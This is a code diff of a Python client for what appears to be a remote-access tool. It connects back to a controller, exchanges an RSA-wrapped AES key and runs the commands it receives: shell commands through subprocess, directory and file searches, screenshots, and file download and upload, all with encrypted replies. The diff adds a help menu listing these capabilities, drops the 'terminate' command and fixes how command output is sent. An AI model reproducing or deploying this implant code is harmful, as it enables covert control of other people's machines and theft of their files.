@@ -3,6 +3,7 @@ import socket
 import subprocess
 from threading import Thread
 from helper_methods import *
+import time
 
 
 class Client(Thread):
@@ -22,7 +23,8 @@ class Client(Thread):
         while True:
             try:
                 AES_KEY = self.conn.recv(1024)
-                self.AES_KEY = RSAFunc_client(AES_KEY).encode('ISO-8859-1', errors='ignore') # Receiving the AES key encrypted in RSA.
+                self.AES_KEY = RSAFunc_client(AES_KEY).encode('ISO-8859-1',
+                                                              errors='ignore')  # Receiving the AES key encrypted in RSA.
                 res = encrypt_client(os.getcwd().encode('ISO-8859-1', errors='ignore'), self.AES_KEY)
                 self.conn.send(res)
                 break
@@ -62,9 +64,16 @@ class Client(Thread):
             except ConnectionResetError:
                 self.__init__(self.IP, self.Port)
                 continue
-            if 'terminate' in command.decode('ISO-8859-1', errors='ignore'):
-                self.conn.close()
-                break
+            if 'help' in command.decode('ISO-8859-1', errors='ignore'):
+                st = 'Possible commands:\n 1) CMD commands\n 2) searchd Space PATH - searches for subdirectories in given path.\n 3) ' \
+     'searchf Space PATH*File_name searches for file in a given path.\n 4) search Space PATH*file_extension - ' \
+     'searches all files with the extension in path.\n 5) screenshot - takes a screenshot of the remote server and ' \
+     'sends the file to the Web server.\n 6) download/grab*PATH of File - downloads a file from the remote server. \n ' \
+     '7) Upload*PATH uploads a file to the remote server.'
+                self.conn.send(encrypt_client(str(len(st)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                self.conn.send(encrypt_client(
+                 st.encode('ISO-8859-1', errors='ignore'),
+                    self.AES_KEY))
             elif 'cd' in command.decode('ISO-8859-1', errors='ignore'):
                 command, path = command.decode('ISO-8859-1', errors='ignore')[0], list_to_path(
                     command.decode('ISO-8859-1', errors='ignore').split(' ')[1:])
@@ -121,7 +130,7 @@ class Client(Thread):
                 self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
             elif 'search' in command.decode('ISO-8859-1', errors='ignore'):
                 command = command.decode('ISO-8859-1', errors='ignore')[7:]
-                path, ext = command.split('*')  # search c:/ *.pdf -> ['c:/', '.pdf']
+                path, ext = command.split('*')  # search c:/*.pdf -> ['c:/', '.pdf']
                 lists = ''
                 for dir_path, dir_name, file_names in os.walk(path):
                     for file in file_names:
@@ -152,10 +161,10 @@ class Client(Thread):
                         new_output = output + errors
                         self.conn.send(
                             encrypt_client(
-                                str(len(encrypt_client(new_output + CMD.stdout.read() + CMD.stderr.read(),
+                                str(len(encrypt_client(new_output,
                                                        self.AES_KEY))).encode(
                                     'ISO-8859-1', errors='ignore'), self.AES_KEY))
-                        self.conn.send(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))
+                        self.conn.send(encrypt_client(new_output, self.AES_KEY))
                     except subprocess.TimeoutExpired:
                         new_output = ''
                         self.conn.send(
